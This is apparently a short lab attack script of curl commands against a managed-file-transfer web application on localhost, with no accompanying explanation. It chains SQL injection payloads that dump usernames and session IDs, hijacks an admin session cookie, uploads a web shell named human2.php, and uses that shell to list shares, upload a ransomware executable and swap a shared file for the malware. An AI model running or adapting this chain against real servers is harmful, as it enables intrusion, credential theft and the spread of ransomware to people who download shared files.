BASE="http://localhost"
KEY="execute"
WEB_SHELL_DIR="C:\payloads\human2.php"
RANSOMWARE_DIR="C:\payloads\installerhack.exe"

curl -G "$BASE/guest.php" --data-urlencode "token=x' UNION SELECT id,username,role FROM users -- -"

curl -G "$BASE/guest.php" --data-urlencode "token=x' UNION SELECT 0,session_id,user_id FROM sessions -- -"

ADMIN_SESSION="8c3f6a1d9e42b750c4d2816fa037be95"

curl -i -H 'Cookie: mft_session=$ADMIN_SESSION' "$BASE/admin/"

curl -b "mft_session=$ADMIN_SESSION" -F "package=@$WEB_SHELL_DIR;filename=human2.php" $BASE/admin/upload.php

curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=users"

curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=shares"

TOKEN="4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934"

curl -H "X-MFT-Key: $KEY" -F "file=@$RANSOMWARE_DIR" "$BASE/uploads/human2.php?action=upload"

MALWARE_FILE_ID="5"

curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=replace_share&token=$TOKEN&file_id=$MALWARE_FILE_ID"

curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=shares"

curl -OJ "$BASE/guest.php?token=$TOKEN"